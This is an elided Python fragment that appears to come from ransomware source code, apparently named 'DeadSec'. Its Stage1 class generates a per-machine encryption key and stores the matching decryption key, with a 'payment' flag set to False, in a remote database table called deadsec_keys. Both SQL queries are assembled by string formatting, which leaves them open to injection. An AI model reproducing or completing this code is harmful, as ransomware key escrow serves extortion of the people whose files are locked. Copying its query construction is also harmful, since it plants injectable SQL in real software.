...
class Stage1:
    ...
    def gen_encrypt_key_and_export(self, unique_machine_id):            
        ...
        request = f"SELECT decrypt_key FROM deadsec_keys WHERE software_key=\'{unique_machine_id}\'"
        ...
        if result_request is None:
            ...
            request = "INSERT INTO deadsec_keys (software_key, decrypt_key, date, payment) VALUES ('%s', '%s', '%s', '%s')" % (unique_machine_id, encrypt_key, time.strftime('%Y-%m-%d %H:%M:%S'), False)
            mycursor.execute(request)
            mydb.close()
